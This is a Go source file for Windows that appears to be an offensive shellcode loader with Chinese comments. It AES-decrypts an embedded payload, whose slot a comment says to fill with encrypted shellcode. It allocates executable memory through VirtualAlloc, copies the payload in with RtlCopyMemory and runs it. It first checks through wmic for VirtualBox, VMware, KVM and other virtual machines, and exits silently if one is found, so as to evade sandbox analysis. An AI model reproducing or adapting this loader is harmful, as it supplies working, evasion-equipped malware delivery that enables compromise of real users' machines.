package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"
)

var iv = "0000000000000000"

func PKCS5UnPadding(origData []byte) []byte {
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}
func AesDecrypt(decodeStr string, key []byte) ([]byte, error) {
	decodeBytes, err := base64.StdEncoding.DecodeString(decodeStr)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	blockMode := cipher.NewCBCDecrypter(block, []byte(iv))
	origData := make([]byte, len(decodeBytes))

	blockMode.CryptBlocks(origData, decodeBytes)
	origData = PKCS5UnPadding(origData)
	return origData, nil
}

func CError(err error) {
	if err != nil {
		fmt.Println(err)
		return
	}
	return
}

func isVirtualMachine() (bool, error) { // 识别虚拟机
	model := ""
	var cmd *exec.Cmd
	cmd = exec.Command("cmd", "/C", "wmic path Win32_ComputerSystem get Model")
	stdout, err := cmd.Output()
	if err != nil {
		return false, err
	}
	model = string(stdout)
	if strings.Contains(model, "VirtualBox") || strings.Contains(model, "Virtual Machine") || strings.Contains(model, "VMware Virtual Platform") ||
		strings.Contains(model, "KVM") || strings.Contains(model, "Bochs") || strings.Contains(model, "HVM domU") || strings.Contains(model, "VMware") {
		return true, nil //如果是虚拟机则返回true
	}
	return false, nil
}

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	KEY_1                  = 90
	KEY_2                  = 91
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func main() {
	bool, _ := isVirtualMachine()
	if !bool {
		var enc_key1 = "zizwsxedc"
		var enc_key2 = "1234567"
		var info_list = [...]string{"sasa2sasas1sssaas", "ssssasa", "aesaes="} // 第三个(aesaes=替换为shellcode)里面放加密过的shellcode
		shellcode, _ := AesDecrypt(info_list[2], []byte(enc_key1+enc_key2))
		addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
		if err != nil && err.Error() != "The operation completed successfully." {
			syscall.Exit(0)
		}
		_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
		if err != nil && err.Error() != "The operation completed successfully." {
			syscall.Exit(0)
		}
		syscall.Syscall(addr, 0, 0, 0, 0)
	} else {
		return // 如果是在虚拟机里则什么都不做
	}
}
